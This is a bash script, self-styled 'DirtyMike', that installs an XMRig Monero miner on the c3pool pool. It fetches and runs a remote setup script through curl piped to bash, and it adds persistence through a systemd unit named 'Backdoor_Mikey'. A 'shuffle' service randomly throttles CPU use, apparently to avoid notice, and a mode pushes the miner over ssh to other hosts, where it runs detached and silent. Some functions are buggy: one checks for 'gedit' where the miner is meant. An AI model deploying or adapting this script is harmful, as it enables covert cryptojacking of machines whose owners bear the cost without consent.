#!/usr/bin/env bash                                   
echo '
                                         ____  _     _       _____ _ _       
                                        |    \|_|___| |_ _ _|     |_| |_ ___ 
                                        |  |  | |  _|  _| | | | | | | ,_| -_|
                                        |____/|_|_| |_| |_  |_|_|_|_|_,_|___|
                                                        |___|                
'

###################################################### PARAMETERS #############################################################
# Pool support many ports that are only different by their starting difficulty. Please select them based on your miner speed:
#     80: 1000 diff (Firewall bypass)
#     443: 1000 diff (Firewall bypass)
#     13333: 25000 diff (auto-adjust)
#     14444: 25000 diff (auto-adjust)
#     15555: 50000 diff (auto-adjust)
#     17777: 50000 diff (auto-adjust)
#     19999: 100000 diff (auto-adjust)
#     23333: 1000000 diff (Proxy/NiceHash)
#     33333: 15000 diff (SSL)
#     43333: 2G diff (ETH port)
#     53333: 2G diff (ETH port/SSL/TLS)
poolPort=17777
# your wallet public address
wallet=YOUR_WALLET_ADDRESS
# installation directory (DONT change)
InstDIR=$HOME
DIR=$HOME/c3pool
# remote build via IP
# remote=true #deprecated run the `. build.sh -r` for remote build deploy
# CPU range for shuffling, will alter the allowed CPU usage for the miner randomly sampled between min and max value (0-100%) 
# each random period of time. These bounds will be applied to each virtual CPU thread.
CPU_min_lim=50
CPU_max_lim=75
# Daemon: service which ensures to restart if the miner terminates unexpectedly
daemon_active=false
# Detatched
detatched=true
###############################################################################################################################



# ======== c3Pool setup script for Monero Miner ======== 
function log () {
    echo "[DirtyMike]: $1"
}
function center () {
    COLUMNS=$(tput cols)
    printf "%*s\n" $(((${#1}+$COLUMNS)/2)) "$1"
}
function killAll () {
    killall -9 cpulimit
    sed -i '/c3pool/d' $HOME/.profile;
    killall -9 xmrig;
    sudo systemctl stop Backdoor_Mikey.service  
    sudo systemctl shuffle.service  
    log 'killed all services.'
}
function stopService () {
    systemctl stop c3pool_miner.service
}
function removeService () {
    # delete default daemon which sucks
    echo "[*] Removing c3pool miner"
    if sudo -n true 2>/dev/null; then
        sudo systemctl stop c3pool_miner.service
        sudo systemctl disable c3pool_miner.service
        sudo rm -f /etc/systemd/system/c3pool_miner.service
        sudo systemctl daemon-reload
        sudo systemctl reset-failed
    fi
}
function CPU_threads () {
    # echo $(cpuThreads)
    grep -c ^processor /proc/cpuinfo
}
function miner_instance_running () {
    # returns boolean if miner is running
    if pgrep -x "gedit" > /dev/null
    then
        echo true
    else
        echo false
    fi
}
function shuffle () {
    sleep 1;
    while true;
    do echo "shuffle CPU limit ...";
    lim=`echo $(shuf -i$CPU_min_lim-$CPU_max_lim -n1)`;
    threads=`echo $(grep -c ^processor /proc/cpuinfo)`;
    log "[CPU threads]:" $threads
    log "[CPU limit shuffle]: limiting CPU usage to $lim% ...";
    log "upper limit $(($threads*$lim))";
    cpulimit -e xmrig -l $(($threads*$lim)) & # 2 t/c
    sleep $(shuf -i15-45 -n1);
    pkill cpulimit; 
    sleep 1; done
}
function runMiner () {
    . $DIR/miner.sh;
}
function setPort () {
    jsonFile=$DIR/config.json;
    lines=''
    while read line; 
    do 
        # override url port value in json
        line="$line"
        if [[ $line == *url* ]]; then
            echo 'url found' $line
            line='"url":"mine.c3pool.com:'$poolPort'",'
        fi
        lines+=$line
    done < $jsonFile;
    echo $lines > $jsonFile
}
function install () {
    if [ ! -d "$DIR" ]; then
        log 'installing XMR mining setup ... [FFA]'
        sudo apt update &&
        sudo apt install -y curl && sudo apt install -y cpulimit
        curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s $wallet
        wait 
        setPort
        removeService && killAll
    else
        echo installation found at $DIR
    fi   
}
function uninstall () {
    echo 'uninstalling DirtyMike ...'
    echo 'uninstall on remote host? (y/n)'; read input
    if [[ "$input" == "y" ]]; then
        echo "Hostname: ";read IP;echo "Login: ";read USER
        ssh $USER@$IP "rm -r $DIR"
    else
        if [ ! -d "$DIR" ]; then
            echo '[DirtyMike]: no miner installation found on this host.';
        else
            rm -r $DIR
            sleep 1; clear;
            center 'Thanks for the F-shack! DirtyMike and the Boyz 😙'
            sleep 5; clear
        fi
    fi
}
function refresh () {
    sudo systemctl daemon-reload
    sudo systemctl reset-failed
}
function daemon () {
    # custom daemon service
    echo "Creating Backdoor Daemon Mikey"
    cat >/tmp/Backdoor_Mikey.service <<EOL
  [Unit]
Description=Dirty Mike
[Service]
ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
Restart=always
Nice=8
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
    log "..... Mikey daemon is here ....."
    sudo systemctl daemon-reload
    sudo systemctl enable Backdoor_Mikey.service
    sudo systemctl start Backdoor_Mikey.service  

    # SHUFFLE
    log "Creating Shuffling Service"
    cat >/tmp/shuffle.service <<EOL
  [Unit]
Description=Shuffle
[Service]
ExecStart=$HOME/build.sh shuffle
Restart=always
Nice=8
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/shuffle.service /etc/systemd/system/shuffle.service
    log "shuffle service initiated ..."
    sudo systemctl daemon-reload
    sudo systemctl enable shuffle.service
    sudo systemctl start shuffle.service
    log "miner will start shortly ..."
}
function build () {
    # kill existing miner instance
    if [[ "$(miner_instance_running)" == "true" ]];then
        echo 'found running miner instance ...'
        killAll       
        wait
    fi
    # run full installation (if needed)
    install  
    # trigger daemon or script directly
    if [[ $daemon_active == true ]]; then
        daemon
    else
        shuffle &
        runMiner
    fi
}


# ----------------- interpret --------------------
mode=$1$2;
if [[ "$mode" == "-r" ]]; then # draw host credentials
    echo "Hostname: ";read IP;echo "Login: ";read USER
    log "$USER deploying build remotely at $IP ..."
    scp -r ./* $USER@$IP:/home && \
    if [[ $detatched == true ]]; then
        ssh $USER@$IP "cd /home; setsid -f bash build.sh > /dev/null 2>&1"
    else
        cat ./build.sh | ssh $USER@$IP /bin/bash
    fi
    log "$IP will start to mine soon!"
elif [[ "$mode" == "-k" ]]; then
    killAll
elif [ "$mode" == "-k-r" ] || [ "$mode" == "-r-k" ];then
    log 'remote KILL 🔪'
    echo "Hostname: ";read IP;echo "Login: ";read USER
    ssh $USER@$IP ". $InstDIR/build.sh -k"
    log "killed $IP ..."
elif [[ "$mode" == "-u" ]]; then
    uninstall
elif [[ "$mode" == "shuffle" ]]; then
    shuffle
else
    build
fi